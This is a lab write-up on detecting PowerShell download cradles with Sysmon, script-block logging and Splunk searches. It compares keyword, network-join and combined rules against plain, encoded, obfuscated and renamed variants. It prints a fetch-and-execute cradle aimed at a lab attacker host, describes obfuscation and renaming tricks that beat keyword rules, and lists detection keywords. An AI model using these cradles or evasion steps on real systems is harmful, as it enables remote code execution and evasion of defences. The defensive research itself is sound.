# D02: Detecting PowerShell download cradles (T1059.001)

**Author:** Mohamed Amine BAHRI · **Status:** lab-validated in Splunk, Wazuh port pending · **Updated:** 2026-11-07

A download cradle is one line of PowerShell that fetches a script from a server and runs it in memory:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.250/marker.ps1')
```

The question for this lab: which detections still work once an attacker starts hiding that line? (Summary table at the end.) Short answer: keyword rules are beaten by simple obfuscation. A rule on the network connection catches every variant I tested, but only after fixing a Sysmon collection problem, and it still needs context to be worth alerting on.

## Setup

| | |
|---|---|
| Endpoint | Target-PC `192.168.10.100`, Windows 10 Pro 22H2 (19045.6456), Windows PowerShell 5.1 |
| Attacker | Kali `192.168.10.250`, `python3 -m http.server 80` |
| Telemetry | Sysmon 15.22 (olafhartong balanced profile, frozen in D01) and PowerShell script-block logging (EID 4104), enabled for this lab and checked end to end with a known-innocent script |
| SIEM | Splunk, index `endpoint` |

The payload appends a unique line to a marker file on the victim. A new line means the code really ran, not just downloaded.

In the final pass (2026-11-02) I launched every run through a small wrapper around `Start-Process -PassThru`, which returns the child's PID. From the PID I took the child's Sysmon `ProcessGuid`, and every result below is filtered on that GUID. That keeps earlier test runs and the PowerShell window I launched them from out of the results.

## 1. Content rules

The obvious first move is to look for the cradle's words.

- **D02-A** (Sysmon EID 1, process creation): a PowerShell process, by image path or `OriginalFileName`, whose command line contains `DownloadString`, `IEX`, `-enc` or `FromBase64String`.
- **D02-B** (EID 4104, script-block logging): a script block containing `DownloadString`, `Net.WebClient`, `IEX`, `Invoke-Expression` or `FromBase64String`.

Both fire on the plain cradle (V1). The next step was to see what breaks them.

## 2. Breaking them

I ran three transformations of the same cradle:

- **V2** sends the whole command base64-encoded with `-enc`.
- **V3** builds every keyword at runtime: `'Net.We'+'bClient'`, and `[char]73+[char]69+[char]88` for `IEX`.
- **V4** copies `powershell.exe` to `%TEMP%\winupdate.exe` and runs the copy.

**V2** splits the two rules. D02-A only matches the `-enc` flag: it knows something was encoded, not what. D02-B sees the full cradle, because PowerShell decodes the command before logging it. Encoding hides the command line, not the script block.

**V4** changes the image name, so D02-A's `\powershell.exe` clause misses. It still matches on `OriginalFileName`, which comes from the binary's own metadata and stays `PowerShell.EXE` after a rename. That is why the rule checks image **or** original file name.

**V3** beats both rules. No keyword exists as literal text in either log. The events are there: searching for fragments the rules don't use (`Net.We`, `char]73`, the IP) finds them. The miss is in the rule, not in the data. PowerShell logged the script block as written, with the pieces still split apart.

Keyword lists can be extended, but V3 shows that whoever writes the cradle controls the text. I needed a signal the attacker cannot rewrite.

## 3. Detecting the connection

**The idea.** Whatever its syntax, the cradle has to connect to the server. Sysmon logs each connection (EID 3) with the `ProcessGuid` of the process that made it. **D02-C** joins the connection to that process's creation event (EID 1) on the GUID and keeps processes whose `OriginalFileName` is `PowerShell.EXE`. Obfuscation and renaming change nothing here.

**The problem.** The first attempt found nothing for the cradles. Sysmon had seen the connections, but logged them with `Image = <unknown process>` (stored in Splunk as `&lt;unknown process&gt;`), and the D01 config only keeps network events whose image is on an include list, so it dropped them. Varying only how long the process lived, a cradle that exits in under a second came out unattributed and a long-running PowerShell came out normally. I report this as observed behaviour, consistent with sensitivity to process lifetime, without claiming a cause. In the final pass, V2 and V4 were unattributed.

**The fix.** The unattributed events still carried a valid `ProcessGuid`, and the matching EID 1 holds the real image, command line and `OriginalFileName`. So I kept every network event regardless of image (`sysmon-collectall-diag.xml`, sha256 `108AEA3DE3C1FDC28FF1B44A3B27F74B704FC4AEB845138F4287781C2471948B`) and let the join recover the identity. D02-C then caught all four variants, including V3 and the renamed V4.

Limits:

- Collection is part of the detection: it fails under the D01 config. In production, scope collection by destination (external, rare) rather than keeping everything.
- It needs the attack to connect out, and a connection is a lead, not proof that code ran.
- It only covers processes identified as `PowerShell.EXE` (not PowerShell 7), on one host at a time (`ProcessGuid` is per machine).

## 4. From detection to alert

PowerShell connects out all the time in normal administration, so D02-C alone is too noisy to alert on. The combined search (`rule-combined.spl`) keeps D02-C's join and adds three context conditions:

- `cond_content`: the command line matches `downloadstring`, `iex`, `invoke-expression`, `frombase64string`, `webclient` or `-enc`;
- `cond_renamed`: the process image (from EID 1) is not named `powershell.exe`, while `OriginalFileName` says it is PowerShell;
- `cond_parent`: the parent is Office or a script host (`winword`, `wscript`, `mshta`...). Not exercised: every run had a PowerShell parent.

Any condition true gives **ALERT**. None gives **HUNT: egress only**, a lead for an analyst.

Each row below is one run, matched by `ProcessGuid`. **Marker** is what actually happened: +1 means the payload ran, 0 means it did not. **Verdict** is what the search said. The last row is a control run that downloads the script without executing it. Times are the Sysmon EID 1 events; all runs as `AMINE\Administrator`.

| Run | Time | PID | ProcessGuid | Marker | Verdict | Driver |
|---|---|---|---|---|---|---|
| V1 clear | 12:37:07 | 7108 | `{cdeca043-75e3-6ae8-4601-000000004b00}` | +1 | ALERT | content |
| V2 encoded | 12:37:18 | 7064 | `{cdeca043-75ee-6ae8-4e01-000000004b00}` | +1 | ALERT | content (`-enc`) |
| V3 obfuscated | 12:37:28 | 6816 | `{cdeca043-75f6-6ae8-5001-000000004b00}` | +1 | HUNT | none |
| V4 renamed | 12:37:33 | 3852 | `{cdeca043-75fd-6ae8-5201-000000004b00}` | +1 | ALERT | renamed + content |
| Control: download only | 12:46:37 | 6392 | `{cdeca043-781d-6ae8-bb01-000000004b00}` | 0 | ALERT | content |

Two rows are the point of this table.

**V3 ran, and the search only raised a hunt lead.** The variant the content rules miss is also the one the combined search does not alert on. That is a deliberate trade-off, since alerting on any PowerShell egress would bury real alerts, but it is still a gap.

**The control run executed nothing, and the search alerted.** `downloadstring` alone satisfies `cond_content`, so the condition fires on a download, not specifically on download-and-execute.

D02-B is not in this search. A 4104 event has no `ProcessGuid`, only a process ID, and attributing by PID is messier than it looks: the PowerShell window that launches the cradle logs its own command line with the same keywords, and half of D02-B's final-pass hits came from my launcher window. That second join is left for a later version.

## Summary

| Variant | A: command line | B: script block | C: network | Combined |
|---|---|---|---|---|
| V1 clear-text | HIT | HIT | HIT | ALERT |
| V2 encoded (`-enc`) | HIT (on `-enc`) | HIT (decoded) | HIT | ALERT |
| V3 obfuscated | MISS | MISS | HIT | HUNT lead |
| V4 renamed | HIT (`OriginalFileName`) | HIT | HIT | ALERT |

A and B are the content rules (section 1), C the network rule (section 3), Combined the search in section 4.

The search keys on behaviour, not intent. An administrator running the same kind of one-liner (Chocolatey's installer follows this pattern) gets the same alert. A false-positive rate needs real traffic, which I did not measure. Tuning should use narrow exceptions for known workflows, never an allowlist for the pattern.

## Defender

Defender was on. It blocked the V3 code when launched as `-Command { }`, which PowerShell passes as `-encodedCommand`, but not as `-c "string"`, so V3 is measured in the `-c` form. It blocked V4 several times on Nov 1 and let it run on Nov 2, after `-nop -w hidden` had been added and its signatures had updated; I did not test which change mattered. The Nov 1 V4 screenshots were taken with real-time protection off.

## Limits and next steps

- Keyword matching is brittle: `-enc` misses the shorter forms `-e` and `-ec`.
- Not tested: AMSI; a downgrade to PowerShell v2, which has no script-block logging; and PowerShell run inside another program. PowerShell is a .NET library that any process can load, so no `powershell.exe` starts and D02-A and D02-C see nothing (D02-B still would, since script-block logging lives in the engine).
- No realistic benign baseline: I did not measure how often normal admin PowerShell triggers these rules.
- One workstation, one config, one Defender policy. Lab-validated, not production-ready.

Next:

- **Module logging (EID 4103) against V3.** This log records each command call with its parameter values after PowerShell evaluates them, so `'Net.We'+'bClient'` should appear as `Net.WebClient`. If it does, V3 becomes detectable by content again.
- **Portability.** Write the combined search as a Sigma correlation rule and run it in Wazuh, the project's second SIEM.

## Files

- `rule.yml`, `rule-scriptblock.yml`: D02-A and D02-B in Sigma. `rule.spl`: both in SPL.
- `rule-network.spl`: D02-C. `rule-combined.spl`: the combined search.
- `sysmon-collectall-diag.xml`: the config D02-C and the combined search were validated under.
- `evidence/`, development runs (Oct 30 to Nov 1):
  - `A0-sbl-validation.png`, `A0-sbl-eventviewer.png`: script-block logging check, in Splunk and in the local log.
  - `A1-D02A-sysmon.png`, `A1-D02B-scriptblock.png`: V1 against D02-A and D02-B.
  - `A2-D02A-sysmon.png`, `A2-D02B-scriptblock.png`, `A2-encode-gen.png`: V2, and how the encoded command was built.
  - `A3-execution.png`, `A3-D02A-miss.png`, `A3-D02B-miss.png`, `A3-telemetry-eid1.png`, `A3-telemetry-4104.png`: V3 ran, both rules miss, the events exist (process creation and script block).
  - `A4-execution-rtp-off.png`, `A4-D02A-rename.png`, `A4-D02B.png`: V4, caught through `OriginalFileName`.
  - `C-network-correlation-both.png`: D02-C catching V3 and V4.
- `evidence/`, final pass (Nov 2):
  - `C-diagnostic-unknownprocess.png`: the four runs, with the `<unknown process>` connection events on V2 and V4.
  - `scriptblock-final-pass.png`: D02-B hits with process ID, separating the child processes from the launcher window.
  - `combined-capstone-1.png`, `combined-capstone-2.png`: the combined search on the four variants and the control run (left and right halves of the same result).

Sysmon config based on olafhartong's [sysmon-modular](https://github.com/olafhartong/sysmon-modular). Technique: [MITRE ATT&CK T1059.001](https://attack.mitre.org/techniques/T1059/001/).
